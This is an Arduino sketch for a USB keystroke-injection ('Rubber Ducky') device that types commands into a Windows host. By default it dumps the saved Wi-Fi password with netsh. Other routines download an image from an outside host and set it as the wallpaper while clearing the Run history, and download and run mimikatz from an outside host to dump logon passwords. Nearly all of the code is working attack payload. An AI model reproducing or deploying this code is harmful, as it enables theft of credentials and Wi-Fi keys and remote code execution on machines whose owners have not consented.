#include "rubber_ducky_lib.h"

Rubber_Ducky rb;
int flag = false;

void setup() {
  pinMode(9, INPUT_PULLUP);
  pinMode(10, INPUT_PULLUP);
  pinMode(11, INPUT_PULLUP);
  pinMode(13, OUTPUT);

  Serial.begin(9600);
}

void loop() {
  switch(readPin()) {
    case 9: 
      wallpaper();
      break;
    case 10:
      rb.setLongTime(100);
      break;
    case 11:
      rb.setLongTime(500);
      break;
    default:
      if(!flag){
        flag = true;
        grabbe_wifi();
      }
      break;
  }

  Serial.println(F("Hello, world?"));
}

int readPin() {
  for (int i = 9; i <= 11; i++)
    if (digitalRead(i) == LOW){
      digitalWrite(13,HIGH);
      return i;
    }
    
  digitalWrite(13,LOW);
  return 0;
}

void wallpaper(){
  rb.init();
  
  rb.powershellRun(
    "(New-Object System.Net.WebClient).DownloadFile('http://imagizer.imageshack.us/a/img924/1862/yR2bGK.jpg','C:/trolled.jpg')\n"
    "reg add \'HKEY_CURRENT_USER\\Control Panel\\Desktop\' /v Wallpaper /t REG_SZ /d  c:\\trolled.jpg /f"
  , true);
  
  rb.longerDelay();
  
  rb.powershellRun(
    "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
  , true);
  
  rb.finish();
}

void mimikatz() {
  rb.init();
  
  rb.powershellRun(
    "(New-Object System.Net.WebClient).DownloadFile('http://zdt.fr/mimikatz.exe','%TEMP%/mimikatz.exe')"
  , true);
  delay(2000);
  rb.Run("%TEMP%\\mimikatz.exe", true);
  rb.longerDelay();
  rb.changeKeyboardLayout();
  rb.shortDelay();
  rb.writeText("privilege::debug", true);
  rb.writeText("sekurlsa::logonPasswords full", true);

  rb.finish();
}

void grabbe_wifi(){
  rb.init();
  
  rb.Run("cmd", true);
  rb.longerDelay();
  
  rb.changeKeyboardLayout();
  
  rb.writeText("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=:\"  %a in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set a=%a", true);
  rb.writeText("netsh wlan show profiles %a% key=clear | findstr  /c:\"Nom du SSID\" /c:\" Authentification\"  /c:\"Contenu de la cl\"| findstr /v \"broadcast\"| findstr /v \"radio\">>log", true);;
  rb.writeText("notepad log & timeout 3 & del log & exit", true);
  
  rb.finish();
}



